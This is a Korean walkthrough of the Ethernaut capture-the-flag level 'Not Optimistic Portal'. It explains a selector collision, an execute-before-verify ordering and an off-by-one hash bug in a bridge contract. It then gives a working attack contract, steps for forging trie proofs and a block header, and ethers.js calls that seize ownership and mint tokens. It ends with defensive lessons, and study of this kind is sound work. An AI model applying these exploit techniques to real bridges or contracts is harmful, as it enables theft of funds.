# Ethernaut Level 40 - Not Optimistic Portal

## 문제 설명

L2 메시지를 검증한 뒤 토큰을 민트해 주는 브리지 포털이다.
겉으로는 state root, account proof, storage proof를 모두 검증하는 것처럼 보이지만,
**검증 이전에 먼저 외부 호출을 실행**한다.

목표는 이 실행 순서를 악용해서
**가짜 L2 상태를 같은 트랜잭션 안에 주입하고, 그 상태를 근거로 내 지갑에 토큰을 민트하는 것**이다.

문제 힌트:

- Function Selector
- CEI 패턴
- Merkle Patricia Trie / RLP

---

## 컨트랙트 분석

### 1. executeMessage()의 실행 순서

```solidity
function executeMessage(
    address _tokenReceiver,
    uint256 _amount,
    address[] calldata _messageReceivers,
    bytes[] calldata _messageData,
    uint256 _salt,
    ProofData calldata _proofs,
    uint16 _bufferIndex
) external nonReentrant {
    bytes32 withdrawalHash = _computeMessageSlot(
        _tokenReceiver,
        _amount,
        _messageReceivers,
        _messageData,
        _salt
    );
    require(!executedMessages[withdrawalHash], "Message already executed");
    require(_messageReceivers.length == _messageData.length, "Message execution data arrays mismatch");

    for (uint256 i; i < _messageData.length; i++) {
        _executeOperation(_messageReceivers[i], _messageData[i], false);
    }

    _verifyMessageInclusion(
        withdrawalHash,
        _proofs.stateTrieProof,
        _proofs.storageTrieProof,
        _proofs.accountStateRlp,
        _bufferIndex
    );

    executedMessages[withdrawalHash] = true;

    if (_amount != 0) {
        _mint(_tokenReceiver, _amount);
    }
}
```

정상적인 브리지라면:

1. proof 검증
2. executed 처리
3. 외부 실행

순서여야 한다.

하지만 이 문제는 반대로:

1. 외부 실행
2. proof 검증
3. mint

순서라서, **검증에 필요한 상태를 실행 중에 바꿔치기**할 수 있다.

### 2. onMessageReceived(bytes) selector 검사

```solidity
function _executeOperation(
    address target,
    bytes calldata callData,
    bool isGovernanceAction
) internal {
    if (!isGovernanceAction) {
        require(bytes4(callData[0:4]) == bytes4(0x3a69197e), "Invalid message entrypoint");
    }
    (bool success, ) = target.call(callData);
    require(success, "Execution failed");
}
```

겉보기에는 `onMessageReceived(bytes)`만 호출 가능한 것처럼 보인다.

하지만 실제로는:

- 인터페이스 호출이 아니라 `target.call(callData)`를 사용
- 앞 4바이트 selector만 `0x3a69197e`인지 확인

즉 **같은 selector를 가진 다른 함수도 실행 가능**하다.

### 3. _computeMessageSlot()의 마지막 원소 누락

```solidity
function _computeMessageSlot(
    address _tokenReceiver,
    uint256 _amount,
    address[] calldata _messageReceivers,
    bytes[] calldata _messageDatas,
    uint256 _salt
) internal pure returns(bytes32){
    bytes32 messageReceiversAccumulatedHash;
    bytes32 messageDatasAccumulatedHash;
    if(_messageReceivers.length != 0){
        for(uint i; i < _messageReceivers.length - 1; i++){
            messageReceiversAccumulatedHash = keccak256(abi.encode(messageReceiversAccumulatedHash, _messageReceivers[i]));
            messageDatasAccumulatedHash = keccak256(abi.encode(messageDatasAccumulatedHash, _messageDatas[i]));
        }
    }
    return keccak256(abi.encode(
        _tokenReceiver,
        _amount,
        messageReceiversAccumulatedHash,
        messageDatasAccumulatedHash,
        _salt
    ));
}
```

반복문이 `i < length - 1`이기 때문에
**배열의 마지막 메시지는 해시에 포함되지 않는다.**

길이가 2라면:

- `0번` 메시지만 `withdrawalHash`에 포함
- `1번` 메시지는 검증 대상 해시에 안 들어감

이 버그 덕분에 **먼저 withdrawalHash를 만든 뒤**
그 해시를 만족하는 가짜 proof / 가짜 block header를
마지막 메시지에 실어 보낼 수 있다.

---

## 취약점 분석

### 1. Selector Collision

문제의 핵심 selector는 `0x3a69197e`다.

```text
onMessageReceived(bytes)                  -> 0x3a69197e
transferOwnership_____610165642(address) -> 0x3a69197e
```

즉 포털이 "메시지 수신 함수만 허용"한다고 생각하고 검사한 selector가
실제로는 **관리자 함수인 transferOwnership**과 충돌한다.

따라서 첫 번째 메시지를 포털 자기 자신에게 보내면
`onMessageReceived(bytes)`가 아니라
`transferOwnership_____610165642(address)`가 실행된다.

### 2. CEI 위반

`executeMessage()`는 검증 전에 외부 호출을 실행한다.

이 말은 곧:

- 먼저 owner를 탈취하고
- sequencer를 바꾸고
- 새 L2 block root를 등록한 뒤
- 그 root를 근거로 proof 검증

이 모두가 **같은 executeMessage() 안에서 가능**하다는 뜻이다.

### 3. Hash Loop 파괴

원래는 이런 구조가 되면 순환 의존성이 생긴다.

```text
withdrawalHash를 만들려면 messageData가 필요
messageData 안에는 proof / header가 필요
proof / header를 만들려면 withdrawalHash가 필요
```

하지만 마지막 메시지가 해시에 안 들어가므로 이 순환이 끊어진다.

즉:

1. 첫 번째 메시지만 기준으로 `withdrawalHash` 계산
2. 그 해시에 맞는 storage proof / state proof 생성
3. 이 proof를 담은 block header를 마지막 메시지에 싣기

가 가능하다.

---

## 공격 아이디어

공격은 크게 두 단계다.

### 1단계 - selector collision으로 owner 탈취

첫 번째 메시지를 아래처럼 만든다.

- `target = portal`
- `callData = abi.encodeWithSignature("transferOwnership_____610165642(address)", attackReceiver)`

selector는 `0x3a69197e`라서 `_executeOperation()` 검사를 통과하고,
실제로는 `transferOwnership`가 실행된다.

결과:

- `owner = attackReceiver`

### 2단계 - attackReceiver를 통해 sequencer 변경 후 가짜 block 제출

두 번째 메시지는 `AttackReceiver.onMessageReceived(bytes)`로 보낸다.
이 함수 안에서:

1. `updateSequencer_____76439298743(address(this))`
2. `submitNewBlock_____37278985983(rlpHeader)`

를 호출하게 만든다.

첫 번째 단계에서 owner를 이미 탈취했으므로
`updateSequencer`가 성공하고,
이제 `attackReceiver`는 새 sequencer가 된다.

그 직후 같은 함수 안에서
우리가 만든 가짜 `stateRoot`를 가진 block header를 제출한다.

그러면 `executeMessage()`는 이후 `_verifyMessageInclusion()`에서
**방금 우리가 집어넣은 root**를 기준으로 proof를 검증하게 된다.

---

## 공격 컨트랙트

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IPortal {
    function updateSequencer_____76439298743(address) external;
    function submitNewBlock_____37278985983(bytes memory) external;
}

contract AttackReceiver {
    IPortal immutable portal;

    constructor(address _portal) {
        portal = IPortal(_portal);
    }

    function onMessageReceived(bytes memory rlpHeader) external {
        portal.updateSequencer_____76439298743(address(this));
        portal.submitNewBlock_____37278985983(rlpHeader);
    }
}
```

역할은 단순하다.

- owner 탈취 이후 sequencer를 자기 자신으로 바꾸고
- 가짜 state root가 들어 있는 새 블록을 제출

---

## 공격 단계

### Step 1 - AttackReceiver 배포

Remix에서 `AttackReceiver`를 배포한다.

```text
_portal = NotOptimisticPortal 인스턴스 주소
```

### Step 2 - 첫 번째 메시지 구성

첫 번째 메시지는 selector collision용이다.

```js
msg0 = abi.encodeWithSignature(
  "transferOwnership_____610165642(address)",
  attackReceiver
)
```

이 메시지는 `withdrawalHash` 계산에 포함된다.

### Step 3 - withdrawalHash 계산

메시지 배열 길이를 2로 잡는다.

```text
messageReceivers[0] = portal
messageReceivers[1] = attackReceiver
```

이때 `_computeMessageSlot()` 버그 때문에
`withdrawalHash`는 `0번 메시지`만 보고 계산된다.

즉:

- `_tokenReceiver = player`
- `_amount = 원하는 민트 수량`
- `_salt = 임의 값`
- `msg0 = transferOwnership(...)`

만 정해지면 `withdrawalHash`를 계산할 수 있다.

### Step 4 - 가짜 storage trie 생성

우리가 증명하고 싶은 것은:

```text
L2_TARGET 계정의 storageRoot 아래에서
key = withdrawalHash
value = 0x01
```

이라는 저장 슬롯이 존재한다는 사실이다.

문제 코드상 실제 trie key는:

```text
keccak256(bytes32(withdrawalHash))
```

형태로 사용된다.

따라서 이 key/value를 가진 storage trie를 만들고 proof를 생성한다.

### Step 5 - 가짜 account state 및 state trie 생성

포털은 계정 상태에서 `storageRoot`만 꺼내 사용한다.

즉 account state를 아래 형태로 만들 수 있다.

```text
[nonce, balance, storageRoot, codeHash]
```

그 후:

- key = `keccak256(L2_TARGET)`
- value = `accountStateRlp`

로 state trie를 구성하고, state proof를 만든다.

### Step 6 - 가짜 RLP block header 생성

포털이 `_extractData()`에서 읽는 값은 네 개뿐이다.

- `parentHash`
- `stateRoot`
- `blockNumber`
- `timestamp`

따라서 다음 조건만 맞추면 된다.

- `parentHash == latestBlockHash`
- `blockNumber == latestBlockNumber + 1`
- `timestamp > latestBlockTimestamp`
- `stateRoot == 우리가 만든 fake state root`

이 값들을 넣어 RLP header를 만든다.

### Step 7 - 두 번째 메시지 구성

두 번째 메시지는 `AttackReceiver.onMessageReceived(bytes)` 호출이다.

```js
msg1 = abi.encodeWithSignature(
  "onMessageReceived(bytes)",
  rlpHeader
)
```

중요한 점:

이 메시지는 **마지막 원소**라서 `withdrawalHash` 계산에 포함되지 않는다.

### Step 8 - executeMessage 호출

최종적으로:

- 첫 번째 메시지로 owner 탈취
- 두 번째 메시지로 sequencer 변경 + fake block 제출
- 이후 proof 검증 통과
- player에게 mint

가 한 트랜잭션 안에서 일어난다.

실행 흐름은 아래와 같다.

```text
executeMessage()
  -> _executeOperation(msg0)
     -> portal.transferOwnership(attackReceiver)

  -> _executeOperation(msg1)
     -> attackReceiver.onMessageReceived(rlpHeader)
        -> portal.updateSequencer(attackReceiver)
        -> portal.submitNewBlock(fakeHeader)

  -> _verifyMessageInclusion(withdrawalHash, proofs, bufferIndex)
     -> 방금 넣은 fake state root 기준으로 검증 통과

  -> _mint(player, amount)
```

---

## 브라우저 콘솔 / Remix 풀이 방식

실제로는 아래 조합이 가장 편하다.

### Remix

- `AttackReceiver` 배포

### 브라우저 콘솔

- selector 계산
- `withdrawalHash` 계산
- trie proof 생성
- `rlpHeader` 생성
- `executeMessage(...)` 호출

핵심 스니펫:

```js
const msg0 = transferIface.encodeFunctionData(
  "transferOwnership_____610165642",
  [ATTACK]
)

const withdrawalHash = ethers.keccak256(
  coder.encode(
    ["address", "uint256", "bytes32", "bytes32", "uint256"],
    [PLAYER, AMOUNT, receiversHash, dataHash, SALT]
  )
)

const msg1 = attackIface.encodeFunctionData(
  "onMessageReceived",
  [rlpHeader]
)

await portal.executeMessage(
  PLAYER,
  AMOUNT,
  [PORTAL, ATTACK],
  [msg0, msg1],
  SALT,
  proofs,
  bufferIndex
)
```

---

## 핵심 교훈

### 1. CEI는 브리지/검증 로직에서 더 중요하다

검증 기반 시스템은 특히
**verify before execute**가 필수다.

이 문제는 execute를 먼저 하면서
검증에 쓰일 root 자체를 공격자가 같은 트랜잭션 안에서 바꾸게 만들었다.

### 2. Selector만 검사하면 의도하지 않은 함수가 열린다

```solidity
require(bytes4(callData[0:4]) == 0x3a69197e);
target.call(callData);
```

이 패턴은 위험하다.

같은 selector를 가진 함수가 하나라도 있으면
보안 경계가 무너진다.

가능하면:

- 명시적 인터페이스 호출
- selector + target 조합 검증
- self-call 금지

가 필요하다.

### 3. 해시 누적 로직의 오프바이원은 치명적이다

배열 마지막 원소가 해시에 빠진 버그 하나 때문에,
원래는 만들기 어려운 증명 데이터와 실행 데이터를 분리할 수 있었다.

특히 브리지 메시지 해시처럼
보안 의미가 큰 누적 해시는 다음을 꼭 확인해야 한다.

- 길이 0
- 길이 1
- 길이 2
- 마지막 원소 포함 여부

### 4. “증명한 데이터”와 “실행한 데이터”는 반드시 동일해야 한다

이 문제의 본질은:

- 해시로 검증한 메시지
- 실제 실행한 메시지

가 완전히 같지 않았다는 점이다.

브리지, 롤업, 멀티콜 시스템에서 가장 위험한 클래스의 버그다.

---

## 참고

- [Ethereum Function Selector 문서](https://docs.soliditylang.org/en/latest/abi-spec.html#function-selector)
- [RLP 문서](https://ethereum.org/en/developers/docs/data-structures-and-encoding/rlp/)
- [Merkle Patricia Trie 문서](https://ethereum.org/en/developers/docs/data-structures-and-encoding/patricia-merkle-trie/)
- [OpenZeppelin Ethernaut](https://ethernaut.openzeppelin.com/)
